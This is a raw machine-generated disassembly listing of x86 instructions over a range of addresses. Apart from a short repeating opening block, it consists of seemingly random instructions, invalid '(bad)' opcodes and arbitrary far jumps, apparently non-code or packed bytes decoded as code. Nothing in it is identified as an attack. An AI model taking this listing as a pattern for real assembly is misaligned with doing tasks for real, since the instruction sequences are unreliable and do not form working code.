  421c54:	inc    ebp
  421c55:	js     0x421cb2
  421c57:	or     eax,0xf630cdf7
  421c5c:	out    0xc9,eax
  421c5e:	aas    
  421c5f:	neg    al
  421c61:	inc    ebp
  421c62:	js     0x421cbf
  421c64:	or     eax,0xf630cdf7
  421c69:	out    0xc9,eax
  421c6b:	aas    
  421c6c:	neg    al
  421c6e:	inc    ebp
  421c6f:	js     0x421ccc
  421c71:	or     eax,0xf630cdf7
  421c76:	out    0xc9,eax
  421c78:	aas    
  421c79:	neg    al
  421c7b:	inc    ebp
  421c7c:	js     0x421cd9
  421c7e:	or     eax,0xf630cdf7
  421c83:	out    0xc9,eax
  421c85:	aas    
  421c86:	neg    al
  421c88:	inc    ebp
  421c89:	js     0x421ce6
  421c8b:	or     eax,0xf630cdf7
  421c90:	out    0xc9,eax
  421c92:	aas    
  421c93:	neg    al
  421c95:	inc    ebp
  421c96:	js     0x421cf3
  421c98:	or     eax,0xf630cdf7
  421c9d:	out    0xc9,eax
  421c9f:	aas    
  421ca0:	neg    al
  421ca2:	inc    ebp
  421ca3:	js     0x421d00
  421ca5:	or     eax,0xf630cdf7
  421caa:	out    0xc9,eax
  421cac:	aas    
  421cad:	neg    al
  421caf:	inc    ebp
  421cb0:	js     0x421d0d
  421cb2:	or     eax,0xf630cdf7
  421cb7:	out    0xc9,eax
  421cb9:	aas    
  421cba:	neg    al
  421cbc:	inc    ebp
  421cbd:	js     0x421d1a
  421cbf:	or     eax,0xf630cdf7
  421cc4:	out    0xc9,eax
  421cc6:	aas    
  421cc7:	mov    cl,0x36
  421cc9:	dec    edi
  421cca:	js     0x421d40
  421ccc:	or     eax,0xf630ddf7
  421cd1:	int    0x6b
  421cd3:	in     eax,0x87
  421cd5:	mov    esi,0x8ac555ba
  421cda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cdb:	and    BYTE PTR [esi],al
  421cdd:	push   ds
  421cde:	hlt    
  421cdf:	jge    0x421c8b
  421ce1:	nop
  421ce2:	test   eax,0xbc4822c1
  421ce7:	inc    eax
  421ce8:	fistp  DWORD PTR [ebp+0x12]
  421ceb:	ins    DWORD PTR es:[edi],dx
  421cec:	dec    eax
  421ced:	stc    
  421cee:	fdivr  DWORD PTR [edx+0x3e6247d5]
  421cf4:	mov    eax,0xe7d4277c
  421cf9:	out    dx,al
  421cfa:	cwde   
  421cfb:	jle    0x421c8a
  421cfd:	adc    al,0x15
  421cff:	repnz aas 
  421d01:	retf   0x2410
  421d04:	inc    edi
  421d05:	xchg   ecx,ebx
  421d07:	fs ror cl,1
  421d0a:	stos   BYTE PTR es:[edi],al
  421d0b:	adc    edx,edi
  421d0d:	popa   
  421d0e:	adc    BYTE PTR [edi+0x1c],dh
  421d11:	xor    DWORD PTR [edx-0x63],ebp
  421d14:	rol    eax,0xa8
  421d17:	mov    cl,ah
  421d19:	pop    ecx
  421d1a:	lods   eax,DWORD PTR ds:[esi]
  421d1b:	ds leave 
  421d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d1e:	(bad)  
  421d1f:	fcom   st(5)
  421d21:	dec    edx
  421d22:	jmp    0x421d8d
  421d24:	jmp    0x421cd5
  421d26:	rcl    ch,0xb0
  421d29:	xchg   DWORD PTR [edi+edi*4],edi
  421d2c:	jmp    0x860d:0xd57c85a5
  421d33:	mov    ebp,0x55c7cafa
  421d38:	mov    al,ds:0x36a10a51
  421d3d:	mov    eax,0xe9183393
  421d42:	adc    eax,0x64bde024
  421d47:	adc    DWORD PTR [esi+edx*2],edx
  421d4a:	fsubr  QWORD PTR [esi+0x1549c5f3]
  421d50:	sbb    al,BYTE PTR [edx-0x2b]
  421d53:	loopne 0x421d39
  421d55:	in     al,dx
  421d56:	es stc 
  421d58:	and    BYTE PTR [edx],ah
  421d5a:	adc    esi,DWORD PTR [ebx]
  421d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d5d:	dec    esi
  421d5e:	cld    
  421d5f:	mov    ch,0x33
  421d61:	and    bh,BYTE PTR ds:0xba8f021e
  421d67:	or     esp,DWORD PTR [eax]
  421d69:	rol    DWORD PTR [ebx+0x2d9acd86],1
  421d6f:	cld    
  421d70:	dec    ecx
  421d71:	pop    ebp
  421d72:	adc    eax,0xdc3f38e6
  421d77:	jl     0x421d40
  421d79:	sbb    DWORD PTR [edx],ebx
  421d7b:	xor    al,bl
  421d7d:	add    eax,0x33228e56
  421d82:	and    BYTE PTR [ebp-0x5f873537],bl
  421d88:	dec    edi
  421d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d8a:	int3   
  421d8b:	inc    esi
  421d8c:	mov    bl,0x71
  421d8e:	frstor [esi+edi*8+0x4055fe18]
  421d95:	sbb    ebx,ebp
  421d97:	call   0x83e48519
  421d9c:	(bad)  
  421d9d:	retf   
  421d9e:	stc    
  421d9f:	add    bl,BYTE PTR [edx]
  421da1:	test   BYTE PTR [ecx+0x50],bh
  421da4:	out    0x3a,eax
  421da6:	pop    eax
  421da7:	add    ecx,DWORD PTR [edi]
  421da9:	fldenv [ebp-0x2199e2a4]
  421daf:	fwait
  421db0:	test   al,0x72
  421db2:	adc    edx,DWORD PTR [esi-0x23b57f22]
  421db8:	xchg   esi,eax
  421db9:	mov    ds:0x973b5532,eax
  421dbe:	inc    esp
  421dbf:	add    edi,ecx
  421dc1:	jnp    0x421dc3
  421dc3:	outs   dx,BYTE PTR ds:[esi]
  421dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dc5:	jbe    0x421dfd
  421dc7:	ja     0x421d72
  421dc9:	push   esi
  421dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dcb:	xchg   ebp,eax
  421dcc:	(bad)  
  421dcd:	cmp    BYTE PTR [ebx-0x2c],bh
  421dd0:	es pop esp
  421dd2:	add    dh,BYTE PTR [ebp+0x2c]
  421dd5:	aad    0xaf
  421dd7:	jns    0x421d92
  421dd9:	jg     0x421e49
  421ddb:	out    dx,eax
  421ddc:	pop    ebp
  421ddd:	sti    
  421dde:	jbe    0x421dfa
  421de0:	scas   al,BYTE PTR es:[edi]
  421de1:	fdiv   QWORD PTR [esi+0x58]
  421de4:	adc    ebx,esp
  421de6:	mov    BYTE PTR [eax],al
  421de8:	inc    ebx
  421de9:	(bad)
  421dec:	pop    esi
  421ded:	fsubrp st(5),st
  421def:	pop    edx
  421df0:	or     DWORD PTR ds:0x1cd82e0a,edi
  421df6:	mov    bh,ch
  421df8:	push   es
  421df9:	test   eax,0x300a4f29
  421dfe:	jp     0x421da4
  421e00:	and    BYTE PTR [ebp+ebx*4+0x51],bh
  421e04:	repnz fstp TBYTE PTR [ebx+0x280d8300]
  421e0b:	add    bp,WORD PTR [esi]
  421e0e:	xchg   BYTE PTR [esi+0x64a54d5c],ch
  421e14:	pop    eax
  421e15:	push   es
  421e16:	jmp    0x9e2521e0
  421e1b:	call   0x21dabdb7
  421e20:	xchg   bl,al
  421e22:	or     ebx,DWORD PTR [ecx+0x2f48ce6f]
  421e28:	ins    BYTE PTR es:[edi],dx
  421e29:	retf   0x699a
  421e2c:	popa   
  421e2d:	and    BYTE PTR [ebx-0x20d32ef9],dl
  421e33:	dec    esi
  421e34:	mov    cl,ch
  421e36:	pop    ss
  421e37:	call   0x830839d2
  421e3c:	test   eax,0x72c55ea
  421e41:	dec    ebp
  421e42:	fcmovb st,st(3)
  421e44:	mov    ebp,0x4eed36fc
  421e49:	ret    0x97f8
  421e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e4d:	retf   0x26d2
  421e50:	push   esp
  421e51:	mov    edx,0xda9bda7
  421e56:	test   eax,edi
  421e58:	xor    al,0xad
  421e5a:	sub    al,0x95
  421e5c:	lahf   
  421e5d:	push   es
  421e5e:	jb     0x421e29
  421e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e61:	pop    ecx
  421e62:	(bad)  
  421e63:	das    
  421e64:	or     BYTE PTR [esi-0xa],0x6
  421e68:	mov    esi,0xee4681f2
  421e6d:	ss jo  0x421e17
  421e70:	mov    esi,0x7309619b
  421e75:	aas    
  421e76:	jmp    FWORD PTR [ebp-0x14]
  421e79:	push   ds
  421e7a:	cdq    
  421e7b:	adc    al,0x67
  421e7d:	jae    0x421ece
  421e7f:	push   es
  421e80:	inc    esp
  421e81:	xchg   ecx,eax
  421e82:	hlt    
  421e83:	inc    ebp
  421e84:	lea    eax,[ebx+eiz*4+0x82e79d]
  421e8b:	or     BYTE PTR [eax],bh
  421e8d:	out    0xd4,al
  421e8f:	xor    ax,0xafde
  421e93:	mov    esi,0xd29e0350
  421e98:	sub    esp,edx
  421e9a:	mov    ah,0xea
  421e9c:	cmp    al,0x5f
  421e9e:	lock xchg BYTE PTR [edi-0x40380036],cl
  421ea5:	inc    edx
  421ea6:	shl    BYTE PTR [eax],0x4e
  421ea9:	cmp    DWORD PTR [ebx+0x6],ebx
  421eac:	scas   al,BYTE PTR es:[edi]
  421ead:	push   ecx
  421eae:	inc    ebp
  421eaf:	cmp    DWORD PTR [eax-0x72216a1],edi
  421eb5:	push   ss
  421eb6:	mov    WORD PTR [ebp-0x3ef9e85],?
  421ebc:	mov    ch,0xa7
  421ebe:	cdq    
  421ebf:	call   0xcdd29051
  421ec4:	sub    eax,esi
  421ec6:	lods   al,BYTE PTR ds:[esi]
  421ec7:	das    
  421ec8:	call   DWORD PTR [ecx]
  421eca:	ins    DWORD PTR es:[edi],dx
  421ecb:	lds    ebx,FWORD PTR [esi]
  421ecd:	pop    edi
  421ece:	push   ebx
  421ecf:	dec    edx
  421ed0:	les    eax,FWORD PTR [ebp+0x2316606f]
  421ed6:	(bad)  gs:[ecx+0x72]
  421eda:	(bad)
  421ede:	xchg   ah,ah
  421ee0:	inc    ebp
  421ee1:	and    BYTE PTR [eax],cl
  421ee3:	add    dl,bl
  421ee5:	fistp  QWORD PTR [eax]
  421ee7:	push   0x94639cd0
  421eec:	or     BYTE PTR [edx-0x4d68be5],0x7
  421ef3:	inc    edi
  421ef4:	shr    BYTE PTR [ebx],cl
  421ef6:	call   0x4008:0x112e0ca5
  421efd:	ja     0x421f5c
  421eff:	mov    cl,0x1e
  421f01:	(bad)  
  421f02:	pusha  
  421f03:	stc    
  421f04:	adc    edi,ebx
  421f06:	jle    0x421f52
  421f08:	jb     0x421ea5
  421f0a:	imul   ebx,DWORD PTR [esi+edi*1+0x65],0xc33f9595
  421f12:	icebp  
  421f13:	cmp    al,0x8
  421f15:	mov    esp,0x91ea26b9
  421f1a:	sub    bl,bh
  421f1c:	xor    ch,BYTE PTR [ebx]
  421f1e:	pop    esi
  421f1f:	inc    esi
  421f20:	hlt    
  421f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f22:	arpl   WORD PTR [ebp-0x6528e0fc],sp
  421f28:	hlt    
  421f29:	pop    edx
  421f2a:	inc    edi
  421f2b:	cmp    esi,DWORD PTR [eax]
  421f2d:	test   DWORD PTR [ebp-0x5dae984b],eax
  421f33:	sub    ebx,DWORD PTR [edx-0x40]
  421f36:	add    ecx,ebx
  421f38:	sbb    ch,ah
  421f3a:	cdq    
  421f3b:	xchg   bl,dh
  421f3d:	pushf  
  421f3e:	push   cs
  421f3f:	gs add esp,esi
  421f42:	cmc    
  421f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f44:	fsubr  st(0),st
  421f46:	sub    ebx,DWORD PTR [edi+0x2e1c9e2b]
  421f4c:	and    dl,cl
  421f4e:	and    ah,ah
  421f50:	aad    0x8d
  421f52:	xor    BYTE PTR [eax-0x20],cl
  421f55:	sub    al,0x65
  421f57:	outs   dx,BYTE PTR ds:[esi]
  421f58:	cdq    
  421f59:	cmp    al,0xdd
  421f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f5c:	pop    edi
  421f5d:	add    bl,bh
  421f5f:	and    bh,BYTE PTR [esi+0x2a596aed]
  421f65:	call   0x6d3882ab
  421f6a:	push   es
  421f6b:	xor    BYTE PTR [esi],dh
  421f6d:	pop    ebp
  421f6e:	xlat   BYTE PTR ds:[ebx]
  421f6f:	popf   
  421f70:	shr    DWORD PTR [esi+0x43],1
  421f73:	aam    0xc
  421f75:	arpl   WORD PTR [esi],bx
  421f77:	and    al,0xc2
  421f79:	int3   
  421f7a:	fsub   QWORD PTR es:[eax-0x5e22a44d]
  421f81:	dec    ebp
  421f82:	xor    al,0x2c
  421f84:	dec    ecx
  421f85:	out    dx,eax
  421f86:	cmp    edx,esp
  421f88:	xchg   ebp,eax
  421f89:	push   eax
  421f8a:	es jg  0x422008
  421f8d:	lds    eax,FWORD PTR [eax+eax*4]
  421f90:	stos   DWORD PTR es:[edi],eax
  421f91:	aad    0x96
  421f93:	jmp    0x1dd:0xe9e7e392
  421f9a:	js     0x421ff9
  421f9c:	ins    BYTE PTR es:[edi],dx
  421f9d:	out    dx,al
  421f9e:	cmp    eax,0x2bc89d4a
  421fa3:	fsub   QWORD PTR [esi+0x192d6b7]
  421fa9:	call   0x222c71f4
  421fae:	out    0x80,al
  421fb0:	ss inc ecx
  421fb2:	add    bh,BYTE PTR ds:0x6e2b216c
  421fb8:	mov    bh,0x18
  421fba:	lahf   
  421fbb:	mov    DWORD PTR [esi+ecx*4+0x46],eax
  421fbf:	fstp   DWORD PTR [ebx+eiz*2-0x54]
  421fc3:	repnz nop
  421fc5:	adc    eax,0x3ce7805
  421fca:	jmp    0x99a5acd9
  421fcf:	and    BYTE PTR [ecx+0x46],0x66
  421fd3:	jns    0x421f87
  421fd5:	jl     0x42204c
  421fd7:	fcmovbe st,st(0)
  421fd9:	cmc    
  421fda:	frstor [esi]
  421fdc:	cmp    ah,BYTE PTR [edi+0x29]
  421fdf:	push   esi
  421fe0:	scas   eax,DWORD PTR es:[edi]
  421fe1:	jnp    0x421ffc
  421fe3:	cli    
  421fe4:	and    BYTE PTR [ebx],ah
  421fe6:	mov    al,ds:0xa9411922
  421feb:	pop    esi
  421fec:	jg     0x421f7c
  421fee:	popa   
  421fef:	mov    edi,0x9b0d4f3f
  421ff4:	dec    esi
  421ff5:	cmp    al,0x5
  421ff7:	dec    edi
  421ff8:	ja     0x42205d
  421ffa:	fdivr  st,st(6)
  421ffc:	mov    edi,0x4b9510e0
  422001:	aam    0xc6
  422003:	adc    al,0xe1
  422005:	jmp    0xfe6a8ea4
  42200a:	jle    0x421fff
  42200c:	add    BYTE PTR [ecx],0x95
  42200f:	push   ss
  422010:	adc    esp,esi
  422012:	clc    
  422013:	adc    DWORD PTR [ecx],edi
  422015:	cmp    dh,BYTE PTR [eax]
  422017:	pop    eax
  422018:	cwde   
  422019:	int3   
  42201a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42201b:	ins    BYTE PTR es:[edi],dx
  42201c:	pop    es
  42201d:	out    dx,eax
  42201e:	call   DWORD PTR [edx]
  422020:	les    ecx,FWORD PTR [esi]
  422022:	retf   
  422023:	aad    0xb3
  422025:	push   cs
  422026:	inc    eax
  422027:	jmp    0x607b4d86
  42202c:	xchg   BYTE PTR [ebx-0x15610ce8],dh
  422032:	mov    edx,0x187ae11c
  422037:	jecxz  0x422072
  422039:	jae    0x421fbc
  42203b:	jge    0x421fe5
  42203d:	loopne 0x421fe4
  42203f:	adc    eax,0xb2d5c14c
  422044:	cmp    eax,0x52dab554
  422049:	mov    ecx,0x2ff719bd
  42204e:	mov    esi,0xd4abf610
  422053:	adc    BYTE PTR [edx],bl
  422055:	mov    dh,0x33
  422057:	xlat   BYTE PTR ds:[ebx]
  422058:	and    eax,0x2729bb9b
  42205d:	pop    ds
  42205e:	lock lods eax,DWORD PTR ds:[esi]
  422060:	lds    ebx,FWORD PTR [ebp+0x19]
  422063:	mov    ebp,eax
  422065:	outs   dx,DWORD PTR ds:[esi]
  422066:	push   ebp
  422067:	lea    ebx,[ecx+0xffd6731]
  42206d:	leave  
  42206e:	ficom  DWORD PTR [ebx-0x6a]
  422071:	mov    edi,0xbbdb5a48
  422076:	or     edx,edi
  422078:	das    
  422079:	xchg   edx,eax
  42207a:	jle    0x42203c
  42207c:	int    0xda
  42207e:	pop    ds
  42207f:	sub    dl,BYTE PTR [edx]
  422081:	and    al,0xa8
  422083:	cmp    al,0x3b
  422085:	scas   eax,DWORD PTR es:[edi]
  422086:	inc    ebp
  422087:	dec    esi
  422088:	sbb    al,0x62
  42208a:	enter  0xb565,0xa1
  42208e:	sar    BYTE PTR [edx+0x766e60c2],0x0
  422095:	ror    BYTE PTR ds:0x638d172c,cl
  42209b:	nop
  42209c:	in     al,0x6
  42209e:	iret   
  42209f:	(bad)  
  4220a0:	push   ebx
  4220a1:	add    BYTE PTR [esi+edi*1+0x5330538e],dl
  4220a8:	stos   DWORD PTR es:[edi],eax
  4220a9:	mov    ecx,0xad85e061
  4220ae:	test   edx,eax
  4220b0:	mov    al,BYTE PTR [ecx+0x77698d9e]
  4220b6:	jmp    0xbe23ecf
  4220bb:	frstor [edi-0x648f57c2]
  4220c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220c2:	jbe    0x4220cd
  4220c4:	or     DWORD PTR [ecx],0xffffff9f
  4220c7:	mov    ds:0x3ce28f84,al
  4220cc:	push   edx
  4220cd:	mov    es,WORD PTR [edi+0x3f]
  4220d0:	push   ebx
  4220d1:	push   edx
  4220d2:	xchg   ebx,eax
  4220d3:	pop    ebx
  4220d4:	mov    ds:0x15c33842,al
  4220d9:	fwait
  4220da:	mov    ?,eax
  4220dc:	add    al,cl
  4220de:	aaa    
  4220df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220e0:	jae    0x422123
  4220e2:	push   cs
  4220e3:	mov    dh,0xfd
  4220e5:	dec    ecx
  4220e6:	push   esp
  4220e7:	sub    BYTE PTR [edi],cl
  4220e9:	cmp    DWORD PTR [ecx+0x6c80c189],ebx
  4220ef:	pop    edi
  4220f0:	(bad)  
  4220f1:	sbb    dh,ah
  4220f3:	mov    al,0x49
  4220f5:	push   edi
  4220f6:	mov    cl,0x8e
  4220f8:	icebp  
  4220f9:	dec    ebp
  4220fa:	xchg   edi,eax
  4220fb:	add    ebp,eax
  4220fd:	mov    ebp,0x847d85f1
  422102:	jg     0x4220f7
  422104:	mov    ah,0x92
  422106:	mov    ecx,0xcdab846e
  42210b:	ffree  st(3)
  42210d:	rcr    BYTE PTR [edx-0x67],1
  422110:	and    dh,BYTE PTR [eax+0x78d354b0]
  422116:	jnp    0x42209e
  422118:	add    al,BYTE PTR [edx-0x7aa3ae75]
  42211e:	mov    dl,0xce
  422120:	or     BYTE PTR [edx+0x3],0x2
  422124:	fiadd  WORD PTR [ebx]
  422126:	and    esi,DWORD PTR [edx+0x508a50a8]
  42212c:	jg     0x4220bc
  42212e:	daa    
  42212f:	xor    DWORD PTR [edx+0x5a2e4c9b],edx
  422135:	cli    
  422136:	lds    ax,DWORD PTR [ecx+0x25e48b15]
  42213d:	retf   
  42213e:	aas    
  42213f:	scas   al,BYTE PTR es:[edi]
  422140:	pop    eax
  422141:	ret    
  422142:	outs   dx,DWORD PTR ds:[esi]
  422143:	cli    
  422144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422145:	lods   al,BYTE PTR ds:[esi]
  422146:	loop   0x422191
  422148:	mov    cl,0xd8
  42214a:	arpl   WORD PTR [eax+ebp*1],sp
  42214d:	mov    ch,0x98
  42214f:	dec    edi
  422150:	nop
  422151:	and    eax,0x5c34b64a
  422156:	aad    0xa5
  422158:	mov    al,ds:0xf0c8c8e2
  42215d:	dec    ebp
  42215e:	(bad)  
  42215f:	jmp    0x1f77:0xc6f76772
  422166:	push   0xecb9007b
  42216b:	ss jnp 0x422127
  42216e:	scas   eax,DWORD PTR es:[edi]
  42216f:	cli    
  422170:	mov    esp,0x18aa43f7
  422175:	repz dec DWORD PTR [eax+0x7af17242]
  42217c:	dec    ecx
  42217d:	sub    ecx,DWORD PTR [eax]
  42217f:	mov    esi,DWORD PTR ds:0x140ac15a
  422185:	call   0xbac8f051
  42218a:	xchg   ebx,eax
  42218b:	push   ebp
  42218c:	inc    ebp
  42218d:	fsubr  DWORD PTR [ebp+0x451b4deb]
  422193:	jmp    0xbf1c4819
  422198:	inc    esi
  422199:	int3   
  42219a:	out    0x69,al
  42219c:	(bad)  
  42219d:	enter  0x8e2c,0x4c
  4221a1:	push   esp
  4221a2:	dec    edx
  4221a3:	loope  0x4221b2
  4221a5:	adc    ch,BYTE PTR [ebx+0x13df003c]
  4221ab:	ficomp WORD PTR [eax]
  4221ad:	adc    eax,0x858c44f4
  4221b2:	inc    ebx
  4221b3:	xchg   ebx,eax
  4221b4:	out    0x4e,eax
  4221b6:	mov    ebx,0x9b469789
  4221bb:	cwde   
  4221bc:	shl    DWORD PTR ds:0x3b6a4bae,cl
  4221c2:	jno    0x42214c
  4221c4:	neg    ah
  4221c6:	mov    BYTE PTR [ecx-0x60b22f25],cl
  4221cc:	ret    0xbc4e
  4221cf:	outs   dx,DWORD PTR ds:[esi]
  4221d0:	out    0x4d,al
  4221d2:	ror    DWORD PTR [eax],0xc5
  4221d5:	xor    bh,BYTE PTR [edx+0x45a2b3ae]
  4221db:	adc    eax,0xcb927ed1
  4221e0:	test   al,0xf4
  4221e2:	in     eax,dx
  4221e3:	xchg   ecx,eax
  4221e4:	mov    eax,0x58726166
  4221e9:	mov    ds:0xdbbc50b,al
  4221ee:	fsub   DWORD PTR [ebp+0x4ece4e3a]
  4221f4:	jge    0x422234
  4221f6:	sahf   
  4221f7:	mov    cl,0xb8
  4221f9:	(bad)
  4221fc:	scas   eax,DWORD PTR es:[edi]
  4221fd:	stos   DWORD PTR es:[edi],eax
  4221fe:	aas    
  4221ff:	(bad)  [ebp-0x1a]
  422202:	push   esi
  422203:	mov    ds:0xa2b9ae3e,al
  422208:	test   BYTE PTR [esi],bl
  42220a:	pop    eax
  42220b:	mov    ecx,0x60af5b07
  422210:	dec    BYTE PTR [edx]
  422212:	aaa    
  422213:	retf   
  422214:	mov    ebp,0x47886252
  422219:	aad    0x11
  42221b:	pavgb  mm2,QWORD PTR [eax]
  42221e:	or     DWORD PTR [ecx+edi*2+0x43],ebx
  422222:	fisttp QWORD PTR [eax-0x75]
  422225:	jno    0x422218
  422227:	fdiv   st(4),st
  422229:	sub    al,0x27
  42222b:	lock mul edi
  42222e:	mov    esi,0x6edceda1
  422233:	(bad)  
  422234:	fs cmp eax,0xa0a7dc5d
  42223a:	daa    
  42223b:	call   0x4737692c
  422240:	lds    esp,FWORD PTR [edx+eax*8+0x30eb553d]
  422247:	test   al,0xa
  422249:	je     0x422298
  42224b:	fwait
  42224c:	jns    0x42227b
  42224e:	inc    ebp
  42224f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422250:	daa    
  422251:	sub    DWORD PTR [ecx+0x4f],esi
  422254:	cwde   
  422255:	scas   eax,DWORD PTR es:[edi]
  422256:	xchg   edi,eax
  422257:	ja     0x422250
  422259:	mov    ch,BYTE PTR ds:0x24da2e4d
  42225f:	jbe    0x422243
  422261:	mov    cl,0x3f
  422263:	test   eax,0xf57e287c
  422268:	xor    al,BYTE PTR [ebx-0x28c16b3e]
  42226e:	mov    ebp,0x5eabf437
  422273:	shl    esi,cl
  422275:	(bad)  
  422276:	or     BYTE PTR [edx],ah
  422278:	fldcw  WORD PTR [edx-0x2]
  42227b:	mov    al,0xe3
  42227d:	sahf   
  42227e:	aad    0xbb
  422280:	push   ss
  422281:	loope  0x4222b0
  422283:	push   eax
  422284:	aam    0x1a
  422286:	push   ebx
  422287:	shl    BYTE PTR fs:[edx-0x11],1
  42228b:	sub    DWORD PTR [edx-0xf10a2eb],edx
  422291:	jne    0x422219
  422293:	pop    es
  422294:	jp     0x422272
  422296:	das    
  422297:	arpl   cx,dx
  422299:	inc    ebp
  42229a:	pop    esp
  42229b:	lds    ebx,FWORD PTR [ebx-0x1d]
  42229e:	xchg   ecx,eax
  42229f:	(bad)  [eax-0xc]
  4222a2:	jecxz  0x42225c
  4222a4:	enter  0x2941,0x86
  4222a8:	pop    ss
  4222a9:	fxch   st(7)
  4222ab:	xchg   BYTE PTR [esi+eax*4+0x3],al
  4222af:	push   ds
  4222b0:	and    al,0x74
  4222b2:	repz push 0x61e73747
  4222b8:	xchg   edx,esi
  4222ba:	mov    WORD PTR [ecx-0xb],?
  4222bd:	test   al,0xc6
  4222bf:	add    dh,al
  4222c1:	xor    eax,0x2d4971a9
  4222c6:	lods   al,BYTE PTR ds:[esi]
  4222c7:	imul   ecx,DWORD PTR [ebx-0x13ebeb1e],0x7678070
  4222d1:	adc    eax,0xa5ee765c
  4222d6:	sub    edi,0x71627368
  4222dc:	data16 cli 
  4222de:	cmp    ebp,eax
  4222e0:	(bad)  
  4222e1:	mov    fs,WORD PTR [esp+esi*1+0x57]
  4222e5:	mov    esi,ecx
  4222e7:	xchg   edx,eax
  4222e8:	add    DWORD PTR [edx],edx
  4222ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222eb:	inc    eax
  4222ec:	xor    BYTE PTR [edx],ah
  4222ee:	icebp  
  4222ef:	dec    esi
  4222f0:	adc    DWORD PTR [ebx-0x4fab9e1c],edi
  4222f6:	jecxz  0x4222a4
  4222f8:	enter  0x2f01,0x88
  4222fc:	mov    ebp,0x2cd75b
  422301:	jnp    0x4222b5
  422303:	adc    dl,bl
  422305:	mov    eax,ds:0x1065d556
  42230a:	inc    ebp
  42230b:	arpl   WORD PTR [edx],sp
  42230d:	mov    esi,0x2a2ac54c
  422312:	xchg   DWORD PTR [ebx+0x19],ebx
  422315:	cmp    BYTE PTR [edi+0x2a],bl
  422318:	int3   
  422319:	cmp    BYTE PTR [ebx+edi*8+0x1],dh
  42231d:	mov    ah,0xd6
  42231f:	fldenv [esi+0x64]
  422322:	xor    dl,0xfc
  422325:	jg     0x422329
  422327:	jb     0x422355
  422329:	and    al,bh
  42232b:	ret    
  42232c:	jo     0x422396
  42232e:	bound  esp,QWORD PTR [ecx+ebx*2]
  422331:	cmp    eax,0x8be3d59c
  422336:	mov    cl,0xd9
  422338:	call   0xd7e:0x3492436b
  42233f:	and    BYTE PTR [esp+ecx*8],bh
  422342:	xchg   DWORD PTR [eax+eax*2-0x634a2b82],edx
  422349:	sub    al,0xe
  42234b:	push   cs
  42234c:	gs stos DWORD PTR es:[edi],eax
  42234e:	aad    0x14
  422350:	aaa    
  422351:	mov    bl,0x0
  422353:	sbb    BYTE PTR [eax-0x402f1866],ch
  422359:	in     eax,0x96
  42235b:	xchg   ecx,eax
  42235c:	mov    WORD PTR [edi+eax*4+0x3e38a6b0],?
  422363:	adc    bh,BYTE PTR [ebx+0x13]
  422366:	xchg   ebx,eax
  422367:	sbb    DWORD PTR [edi+0x66],0xc58706ea
  42236e:	mov    ebx,0xd7cf6ba9
  422373:	pop    edx
  422374:	call   0xc98ecda4
  422379:	sbb    cl,ch
  42237b:	mov    esi,0xe94a6558
  422380:	fld    TBYTE PTR [edx]
  422382:	fwait
  422383:	push   ds
  422384:	icebp  
  422385:	dec    ebx
  422386:	fisttp DWORD PTR [edi+edi*1-0x7b24aabe]
  42238d:	(bad)  
  42238e:	adc    BYTE PTR [edi-0x450cdae1],ah
  422394:	imul   ecx,DWORD PTR [eax+0x336e85bf],0xad9c06e1
  42239e:	add    DWORD PTR [ebp-0x1a],esi
  4223a1:	mov    dh,0x52
  4223a3:	jno    0x422375
  4223a5:	cwde   
  4223a6:	int3   
  4223a7:	(bad)  
  4223a8:	neg    al
  4223aa:	push   ebp
  4223ab:	adc    al,0xa6
  4223ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223ae:	jmp    0x42238f
  4223b0:	int3   
  4223b1:	push   0x48cfe5d8
  4223b6:	or     edx,edx
  4223b8:	jns    0x422408
  4223ba:	push   edx
  4223bb:	xchg   ebx,eax
  4223bc:	mov    eax,esi
  4223be:	leave  
  4223bf:	das    
  4223c0:	retf   
  4223c1:	cdq    
  4223c2:	mov    BYTE PTR [ecx+0x44],ch
  4223c5:	or     ebp,DWORD PTR [ebp+0x43]
  4223c8:	xchg   BYTE PTR [ecx],dh
  4223ca:	das    
  4223cb:	retf   
  4223cc:	data16 adc al,0x46
  4223cf:	or     eax,0x6e0de8fe
  4223d4:	xchg   BYTE PTR [ecx+0x45d08f86],bl
  4223da:	lods   eax,DWORD PTR ds:[esi]
  4223db:	repnz stos BYTE PTR es:[edi],al
  4223dd:	xor    DWORD PTR [esi-0x2987d96a],edx
  4223e3:	iret   
  4223e4:	shl    eax,1
  4223e6:	out    dx,al
  4223e7:	mov    cl,0xa9
  4223e9:	mov    ch,BYTE PTR [edi-0x6a]
  4223ec:	(bad)  
  4223ee:	enter  0x188c,0x8f
  4223f2:	pop    edx
  4223f3:	push   0xa745c38d
  4223f8:	test   DWORD PTR [eax+0x4abeb393],ebp
  4223fe:	in     al,0x56
  422400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422401:	sar    BYTE PTR ss:[eax+esi*2+0x34],cl
  422406:	test   eax,0x81895d6b
  42240b:	lods   eax,DWORD PTR ds:[esi]
  42240c:	fisub  DWORD PTR ds:0xfed2a8db
  422412:	push   ebp
  422413:	jecxz  0x422442
  422415:	mov    bh,0x5f
  422417:	retf   0xc2a
  42241a:	and    eax,0xc7501631
  42241f:	pop    es
  422420:	jl     0x42249c
  422422:	jno    0x422450
  422424:	xor    bl,ah
  422426:	clc    
  422427:	mov    ds:0xe914a0b,eax
  42242c:	sub    eax,0x503c6f1
  422431:	(bad)  
  422432:	mov    edx,0x4dbe03dd
